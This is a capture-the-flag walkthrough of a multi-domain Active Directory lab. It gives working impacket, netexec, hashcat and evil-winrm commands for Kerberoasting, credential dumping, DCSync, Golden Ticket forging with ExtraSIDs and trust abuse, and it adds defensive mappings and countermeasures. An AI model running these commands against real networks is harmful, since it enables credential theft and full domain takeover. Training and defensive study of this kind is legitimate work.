# Sec4US CTF: Active Directory Forest Lab

Writeup for the Sec4US Active Directory Forest lab: a multi-domain environment that challenges players to go from a low-privileged student account all the way to Enterprise Admin across an entire forest, including an external trust domain.

> **Platform:** [Sec4US](https://sec4us.com.br/) (private lab, VPN required)
> **Category:** Active Directory / Red Team
> **Difficulty:** Hard
> **Total Points:** 1,275 (8 flags)
> **Training:** Based on the Sec4US AD training by M4v3r1ck / Helvio Junior

---

## Table of Contents

- [Environment Overview](#environment-overview)
- [Kill Chain Summary](#kill-chain-summary)
- [Phase 0: Setup and Preparation](#phase-0-setup-and-preparation)
- [Phase 1: Reconnaissance](#phase-1-reconnaissance)
- [Phase 2: BloodHound Collection](#phase-2-bloodhound-collection)
- [Phase 3: Flag 1, Porta de Entrada (50 pts)](#phase-3-flag-1-porta-de-entrada-50-pts)
- [Phase 4: Flag 2, Raiz do WEB01 (75 pts) and Flag 3, Segredo Bem Guardado (100 pts)](#phase-4-flag-2-raiz-do-web01-75-pts-and-flag-3-segredo-bem-guardado-100-pts)
- [Phase 5: Flag 4, Dialogo Privilegiado (150 pts)](#phase-5-flag-4-dialogo-privilegiado-150-pts)
- [Phase 6: Flag 5, Territorio Filho (200 pts)](#phase-6-flag-5-territorio-filho-200-pts)
- [Phase 7: Flags 6 and 7, Elo de Confianca and Coroa do Reino (450 pts)](#phase-7-flags-6-and-7-elo-de-confianca-and-coroa-do-reino-450-pts)
- [Phase 8: Flag 8, Reino Vizinho (250 pts)](#phase-8-flag-8-reino-vizinho-250-pts)
- [Security Frameworks](#security-frameworks)
- [Tools Used](#tools-used)

---

## Environment Overview

The lab consists of a Windows Active Directory Forest with multiple domains, nine hosts, and trust relationships:

| IP | Role | Description |
|----|------|-------------|
| 192.168.30.220 | TERMSERV | Entry point: RDP access with student credentials |
| 192.168.30.230 | DC1 (Root DC) | Domain Controller for sec4us.local (forest root) |
| 192.168.30.250 | DC2 (Child DC) | Domain Controller for the child domain |
| 192.168.30.251 | WEB01 | Web server hosting internal applications |
| 192.168.30.236 | DB01 | Database server (SQL Server) |
| 192.168.30.237 | FS01 | File server |
| 192.168.30.238 | APP01 | Application server |
| 192.168.30.234 | EXT-DC | Domain Controller for an external trust domain |
| 192.168.30.235 | MGMT | Management server |

### Flags

| # | Flag Name | Points | Objective |
|---|-----------|--------|-----------|
| 1 | Porta de Entrada | 50 | Recover a service account password |
| 2 | Raiz do WEB01 | 75 | Achieve local admin on the web server |
| 3 | Segredo Bem Guardado | 100 | Find a forgotten application credential |
| 4 | Dialogo Privilegiado | 150 | Extract a database account password in cleartext |
| 5 | Territorio Filho | 200 | Compromise the child domain (Domain Admin) |
| 6 | Elo de Confianca | 150 | Obtain a service account secret from the root domain |
| 7 | Coroa do Reino | 300 | Achieve full control of sec4us.local |
| 8 | Reino Vizinho | 250 | Compromise the external trust domain |

---

## Kill Chain Summary

```
Student Account (RDP)
    |
    v
[Kerberoasting] --> Service Account Password (Flag 1)
    |
    v
[WinRM/Web Exploit] --> Local Admin on WEB01 (Flag 2)
    |
    v
[DPAPI / GPP / Cred Files] --> Application Credential (Flag 3)
    |
    v
[SQL Server / LSASS Dump] --> DB Password in Cleartext (Flag 4)
    |
    v
[ACL Abuse / Delegation] --> Domain Admin on Child Domain (Flag 5)
    |
    v
[Trust Traversal / SPN] --> Root Domain Service Secret (Flag 6)
    |
    v
[DCSync KRBTGT / Golden Ticket] --> Full Forest Control (Flag 7)
    |
    v
[Forest Trust / SID History / raiseChild] --> External Domain (Flag 8)
```

---

## Phase 0: Setup and Preparation

Connect to the Sec4US VPN and verify connectivity:

```bash
sudo openvpn --config sec4us.ovpn
# Wait for "Initialization Sequence Completed"

# Verify tun0 interface
ip addr show tun0
ping -c 1 192.168.30.220
```

Add lab hosts to `/etc/hosts` for convenience:

```bash
echo "192.168.30.220 TERMSERV" | sudo tee -a /etc/hosts
echo "192.168.30.230 DC1 sec4us.local" | sudo tee -a /etc/hosts
echo "192.168.30.250 DC2" | sudo tee -a /etc/hosts
```

### Required Tools

```bash
pip3 install impacket bloodhound ldap3 pypykatz enum4linux-ng mitm6
go install github.com/ropnop/kerbrute@latest
```

Key tools: `impacket` (Kerberoasting, secretsdump, ticketer, psexec), `bloodhound-python` (AD graph collection), `netexec/nxc` (SMB/LDAP/WinRM enumeration), `evil-winrm` (PowerShell remote), `responder` (LLMNR/NBT-NS poisoning), `hashcat` (offline cracking).

---

## Phase 1: Reconnaissance

### 1.1 RDP to the Entry Point

The lab provides student credentials (e.g., `aluno.01` / `Aluno@01`). RDP into TERMSERV:

```bash
xfreerdp /v:192.168.30.220 /u:aluno.01 /p:'Aluno@01' /dynamic-resolution /clipboard
```

### 1.2 Network Scanning

Scan the lab subnet for AD-related services:

```bash
nmap -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269,5985 \
  192.168.30.0/24 -oN nmap_full.txt
```

### 1.3 SMB and LDAP Enumeration

```bash
# Identify all SMB-enabled hosts and signing status
nxc smb 192.168.30.0/24 --gen-relay-list relay_targets.txt

# Enumerate domain computers via LDAP
nxc ldap 192.168.30.230 -u 'aluno.01' -p '[STUDENT_PASS]' \
  --query "(objectClass=computer)" "dNSHostName"

# List shares on all hosts
nxc smb 192.168.30.0/24 -u 'aluno.01' -p '[STUDENT_PASS]' --shares
```

Pay attention to: hosts with SMB signing disabled (relay targets), accessible shares, WinRM open ports, and domain trust information.

---

## Phase 2: BloodHound Collection

BloodHound is essential for mapping AD attack paths:

```bash
bloodhound-python -u 'aluno.01' -p '[STUDENT_PASS]' \
  -d sec4us.local -ns 192.168.30.230 \
  -c All --zip
```

Import the ZIP into the BloodHound GUI and run queries:

- **Find Shortest Paths to Domain Admins**: reveals the escalation chain
- **Kerberoastable Users**: identifies service accounts with SPNs
- **AS-REP Roastable Users**: accounts without Kerberos pre-authentication
- **Find All Domain Admins**: understand the target group membership

---

## Phase 3: Flag 1, Porta de Entrada (50 pts)

**Objective:** Recover a service account password via Kerberos offline attack.

### 3.1 AS-REP Roasting

Check for accounts without Kerberos pre-authentication:

```bash
impacket-GetNPUsers sec4us.local/ \
  -usersfile usernames.txt -no-pass \
  -dc-ip 192.168.30.230 -format hashcat \
  -outputfile hashes/asrep.txt
```

### 3.2 Kerberoasting

Request TGS tickets for accounts with Service Principal Names:

```bash
impacket-GetUserSPNs sec4us.local/aluno.01:'[STUDENT_PASS]' \
  -dc-ip 192.168.30.230 -request \
  -outputfile hashes/kerberoast.txt
```

### 3.3 Offline Cracking

Crack the captured hashes with hashcat:

```bash
# AS-REP hash (mode 18200)
hashcat -m 18200 hashes/asrep.txt /usr/share/wordlists/rockyou.txt

# Kerberoast hash (mode 13100)
hashcat -m 13100 hashes/kerberoast.txt /usr/share/wordlists/rockyou.txt
```

The cracked password is your first flag. Submit the plaintext password on the platform.

---

## Phase 4: Flag 2, Raiz do WEB01 (75 pts) and Flag 3, Segredo Bem Guardado (100 pts)

**Objective:** Gain local admin on WEB01 and find a forgotten application credential.

### 4.1 Lateral Movement to WEB01

Using the service account credentials from Phase 3, test access to WEB01:

```bash
nxc winrm 192.168.30.251 -u '<svc_account>' -p '<cracked_password>'
```

If WinRM is open, connect with evil-winrm:

```bash
evil-winrm -i 192.168.30.251 -u '<svc_account>' -p '<cracked_password>'
```

### 4.2 Token Impersonation

Once on WEB01, check for impersonation privileges. If the service account has `SeImpersonatePrivilege`, use token impersonation techniques to elevate to local admin or SYSTEM.

### 4.3 Credential Hunting

Search for forgotten credentials on the web server:

```powershell
# IIS configuration files
type C:\inetpub\wwwroot\web.config

# Group Policy Preferences passwords
Get-ChildItem "\\sec4us.local\SYSVOL" -Recurse -Filter "*.xml" | Select-String "cpassword"

# DPAPI credential files
dir C:\Users -Recurse -Filter "*.xml" -ErrorAction SilentlyContinue
dir C:\Users -Recurse -Filter "*.config" -ErrorAction SilentlyContinue
```

Look in: IIS `web.config`, SYSVOL GPP XML files, registry stored credentials, DPAPI-protected blobs, and config/ini files.

---

## Phase 5: Flag 4, Dialogo Privilegiado (150 pts)

**Objective:** Extract a database account password in cleartext.

### 5.1 SQL Server Access

Connect to the database server using discovered credentials:

```bash
nxc mssql 192.168.30.236 -u '<svc_account>' -p '<password>' \
  -q "SELECT name FROM master.dbo.sysdatabases"
```

### 5.2 xp_cmdshell and Credential Extraction

If you have sufficient privileges on SQL Server:

```bash
nxc mssql 192.168.30.236 -u '<account>' -p '<password>' \
  --local-auth -q "EXEC xp_cmdshell 'whoami'"
```

### 5.3 LSASS / SAM Dump

If you achieve local admin on the DB server:

```bash
nxc smb 192.168.30.236 -u '<localadmin>' -p '<password>' --lsa
nxc smb 192.168.30.236 -u '<localadmin>' -p '<password>' --sam
```

The plaintext database password is the flag.

---

## Phase 6: Flag 5, Territorio Filho (200 pts)

**Objective:** Achieve Domain Admin in the child domain.

### 6.1 Identify the Path

Use BloodHound to find the shortest path from your current access to Domain Admin in the child domain. Common vectors include:

- **ACL abuse**: WriteDACL, GenericAll, GenericWrite on key objects
- **Constrained Delegation**: services allowed to delegate to specific SPNs
- **Unconstrained Delegation**: capture TGTs from connecting principals
- **GPO abuse**: modify Group Policy linked to privileged OUs

### 6.2 DCSync the Child Domain

Once you have DA in the child domain, dump all NTLM hashes:

```bash
impacket-secretsdump '<child_domain>/<da_account>:<password>'@192.168.30.250 \
  -just-dc-ntlm
```

This provides all password hashes in the child domain, including the KRBTGT hash needed for the next phase.

---

## Phase 7: Flags 6 and 7, Elo de Confianca and Coroa do Reino (450 pts)

**Objective:** Escalate from child domain DA to Enterprise Admin in the forest root.

### 7.1 Trust Enumeration

Understand the trust relationship between the child domain and the forest root:

```bash
nxc ldap 192.168.30.230 -u 'administrator' -H '<ntlm_hash>' -M trusts
```

### 7.2 Option A: raiseChild Attack

The `raiseChild` technique automates child-to-parent domain escalation:

```bash
impacket-raiseChild -target-exec 192.168.30.230 \
  '<child_domain>/<child_da>:<password>'
```

### 7.3 Option B: Golden Ticket with ExtraSIDs

Manually forge a Golden Ticket that includes the Enterprise Admins SID from the parent domain:

```bash
# 1. Get the KRBTGT hash from the child domain
impacket-secretsdump '<child_domain>/<da>'@<child_dc_ip> -just-dc-user krbtgt

# 2. Get the parent domain SID
impacket-lookupsid sec4us.local/Guest@192.168.30.230

# 3. Forge the ticket with Enterprise Admin SID (-519)
impacket-ticketer -nthash <krbtgt_hash> \
  -domain '<child_domain>' -domain-sid <child_sid> \
  -extra-sid <parent_sid>-519 administrator

# 4. Use the forged ticket
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass sec4us.local/administrator@192.168.30.230
```

### 7.4 Full Forest DCSync

With EA access, dump the entire forest root domain:

```bash
impacket-secretsdump -k -no-pass \
  sec4us.local/administrator@192.168.30.230 -just-dc-ntlm
```

---

## Phase 8: Flag 8, Reino Vizinho (250 pts)

**Objective:** Compromise the external trust domain (the "neighboring kingdom").

### 8.1 Forest Trust Analysis

Enumerate the forest trust from sec4us.local to the external domain:

```bash
nxc ldap 192.168.30.230 -u 'administrator' -H '<ntlm>' -M trusts
```

### 8.2 SID History Attack

If SID filtering is not enforced on the forest trust, forge an inter-realm TGT with the target domain's Enterprise Admin SID:

```bash
impacket-ticketer -nthash <root_krbtgt_hash> \
  -domain sec4us.local -domain-sid <root_sid> \
  -extra-sid <neighbor_sid>-519 administrator
```

### 8.3 Trust Key Extraction

An alternative approach: extract the trust account's NTLM hash to forge inter-realm tickets:

```bash
impacket-secretsdump sec4us.local/administrator@192.168.30.230 \
  -just-dc-user '<neighbor_domain>$'
```

Once you have access to the external DC at 192.168.30.234, retrieve the final flag.

---

## Security Frameworks

### MITRE ATT&CK Mapping

| Technique | ID | Phase |
|-----------|----|-------|
| Remote Desktop Protocol | T1021.001 | Initial Access (TERMSERV) |
| Kerberoasting | T1558.003 | Credential Access (Flag 1) |
| AS-REP Roasting | T1558.004 | Credential Access (Flag 1) |
| Token Impersonation/Theft | T1134.001 | Privilege Escalation (Flag 2) |
| Unsecured Credentials: Group Policy Preferences | T1552.006 | Credential Access (Flag 3) |
| Credentials in Files | T1552.001 | Credential Access (Flag 3) |
| DPAPI Credential Access | T1555.004 | Credential Access (Flag 3) |
| OS Credential Dumping: LSASS Memory | T1003.001 | Credential Access (Flag 4) |
| OS Credential Dumping: Security Account Manager | T1003.002 | Credential Access (Flag 4) |
| OS Credential Dumping: DCSync | T1003.006 | Credential Access (Flag 5) |
| Steal or Forge Kerberos Tickets: Golden Ticket | T1558.001 | Credential Access (Flag 7) |
| Access Token Manipulation: SID-History Injection | T1134.005 | Privilege Escalation (Flag 8) |
| Use Alternate Authentication Material: Pass the Ticket | T1550.003 | Lateral Movement |
| Remote Services: WinRM | T1021.006 | Lateral Movement |
| Remote Services: SMB/Windows Admin Shares | T1021.002 | Lateral Movement |
| Password Cracking | T1110.002 | Credential Access |

### NIST SP 800-53 Rev. 5 Controls Tested

| Control | Description | Finding |
|---------|-------------|---------|
| AC-2 | Account Management | Service accounts with weak passwords, excessive privileges |
| AC-6 | Least Privilege | Overly permissive ACLs, unnecessary delegation |
| IA-5 | Authenticator Management | Passwords in GPP XML, DPAPI unprotected creds |
| SC-12 | Cryptographic Key Establishment | KRBTGT key compromise enables Golden Ticket |
| SI-4 | System Monitoring | Lack of detection for DCSync, Kerberoasting, token abuse |
| AC-17 | Remote Access | Unrestricted WinRM, RDP without MFA |

### CWE References

| CWE | Description | Context |
|-----|-------------|---------|
| CWE-521 | Weak Password Requirements | Service accounts crackable with rockyou.txt |
| CWE-256 | Plaintext Storage of a Password | Credentials in web.config, GPP files, SYSVOL |
| CWE-269 | Improper Privilege Management | Excessive delegation, unrestricted trust relationships |
| CWE-284 | Improper Access Control | Missing SID filtering on forest trusts |
| CWE-922 | Insecure Storage of Sensitive Information | DPAPI blobs accessible to compromised accounts |

### MITRE D3FEND Countermeasures

| Technique | D3FEND ID | Description |
|-----------|-----------|-------------|
| Credential Hardening | D3-CH | Enforce strong passwords on service accounts, use gMSA |
| Kerberos Ticket Analysis | D3-KTA | Monitor for Kerberoasting patterns (high TGS volume) |
| Authentication Event Thresholding | D3-AET | Alert on rapid Kerberos ticket requests |
| Credential Transmission Scoping | D3-CTS | Restrict delegation, enforce SID filtering on trusts |
| Domain Trust Policy | D3-DTP | Implement selective authentication, quarantine forest trusts |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| [Impacket](https://github.com/fortra/impacket) | Kerberoasting, secretsdump, ticketer, psexec, raiseChild |
| [BloodHound](https://github.com/BloodHoundAD/BloodHound) | AD attack path mapping and visualization |
| [NetExec (nxc)](https://github.com/Penntest-AG/NetExec) | SMB/LDAP/WinRM/MSSQL enumeration and attack |
| [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) | PowerShell remote shell via WinRM |
| [Responder](https://github.com/lgandx/Responder) | LLMNR/NBT-NS/mDNS poisoning |
| [Hashcat](https://hashcat.net/hashcat/) | Offline password hash cracking |
| [Kerbrute](https://github.com/ropnop/kerbrute) | Kerberos brute-force and user enumeration |
| [Nmap](https://nmap.org/) | Network scanning and service discovery |

---

## Key Takeaways

1. **Kerberoasting is the gateway**: a single weak service account password opens the path to the entire forest.
2. **BloodHound is non-negotiable**: the lab's complexity makes manual enumeration impractical.
3. **Trust relationships are attack paths**: parent-child trusts and forest trusts each have distinct exploitation techniques (Golden Ticket with ExtraSIDs vs. SID History injection).
4. **Credentials accumulate**: each phase yields credentials that unlock the next. Systematic loot management is essential.
5. **Defense insight**: gMSA for service accounts, SID filtering on forest trusts, monitoring for DCSync and Kerberoasting, and least-privilege delegation would shut down most of this kill chain.

---

The forest fell not because of a single flaw, but because each small crack in the foundation let gravity do the rest. Trust, by design, was the bridge; by neglect, it became the breach.

Thanks guys!! (❍ᴥ❍ʋ)

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
